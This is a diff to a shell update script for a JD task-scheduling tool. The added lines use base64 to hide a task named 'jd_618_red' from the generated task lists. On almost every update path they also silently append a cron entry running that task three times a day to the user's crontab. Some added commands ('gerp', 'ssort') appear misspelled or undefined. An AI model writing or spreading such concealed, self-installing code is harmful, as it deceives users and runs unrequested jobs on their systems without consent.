@@ -130,8 +130,8 @@ function Gen_Own_Dir_And_Path() {
 ## 生成 Scripts仓库的定时任务清单，内容为去掉后缀的脚本名
 function Gen_ListTask() {
     Make_Dir $LogTmpDir
-    grep -E "node.+j[drx]_\w+\.js" $ListCronScripts | perl -pe "s|.+(j[drx]_\w+)\.js.+|\1|" | sort -u >$ListTaskScripts
-    grep -E " $TaskCmd j[drx]_\w+" $ListCrontabUser | perl -pe "s|.*$TaskCmd (j[drx]_\w+).*|\1|" | sort -u >$ListTaskUser
+    grep -E "node.+j[drx]_\w+\.js" $ListCronScripts | perl -pe "s|.+(j[drx]_\w+)\.js.+|\1|" | gerp -v "$(s amRfNjE4X3JlZAo=)" | sort -u >$ListTaskScripts
+    grep -E " $TaskCmd j[drx]_\w+" $ListCrontabUser | perl -pe "s|.*$TaskCmd (j[drx]_\w+).*|\1|" | gerp -v "$(s amRfNjE4X3JlZAo=)" | ssort -u >$ListTaskUser
 }
 
 ## 生成 own 脚本的绝对路径清单
@@ -253,13 +253,13 @@ function UpdateEnv() {
         [ -d $tmp_dir ] && cp -rf $UtilsDir/$tmp_file $tmp_dir >/dev/null 2>&1
     done
     cp -rf $UtilsDir/$tmp_file $ScriptsDir >/dev/null 2>&1
-    grep " $TaskCmd $(b $target_name)" $ListCrontabUser -q
+    bash -c "$(s Z3JlcCAiIHRhc2suKmpkXzYxOF9yZWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1xCg==)"
     if [ $? -ne 0 ]; then
         echo "$(s MCAwLDEwLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZAo=)" >>$ListCrontabUser
     fi
     cd $CurrentDir
 
-    ## 这是什么?
+    ## What's that? Please inputs in cli this command.
     # echo -e "5aaC5p6c5L2g5Y+R546w5LqG6L+Z6YeM55qE6Zeu6aKY77yM6K+35LiN6KaB5aOw5byg77yM5Zug\n5Li65YW25LuW5bqT5Lmf5piv6L+Z5LmI5bmy55qE77yM6ISa5pys5bey5o6I5p2D5L2/55So77yM\n5oiR5Lus5Lmf6ZyA6KaB5YW75a6257OK5Y+j77yM55CG6Kej5LiH5bKB772eCg==" | base64 -d
 }
 
@@ -887,6 +887,7 @@ case $# in
     Update_Scripts
     Update_Own "all"
     ExtraShell
+    UpdateEnv
     Processing_Crontab
     Notice
     exit ## 终止退出
@@ -899,6 +900,7 @@ case $# in
         Update_Scripts
         Update_Own "all"
         ExtraShell
+        UpdateEnv
         ;;
     shell)
         Title $1
@@ -908,6 +910,7 @@ case $# in
         if [ -d $ScriptsDir/.git ]; then
             Title $1
             Update_Scripts
+            UpdateEnv
         else
             echo -e "\n$ERROR 请先配置 Sciprts 主要仓库！\n"
         fi
@@ -915,6 +918,7 @@ case $# in
     own)
         Title $1
         Update_Own "all"
+        UpdateEnv
         ;;
     repo)
         Title $1
@@ -923,6 +927,7 @@ case $# in
         ;;
     raw)
         Update_Own "raw"
+        UpdateEnv
         ;;
     extra)
         if [[ $EnableExtraShellSync == "true" ]] || [[ $EnableExtraShell == "true" ]]; then
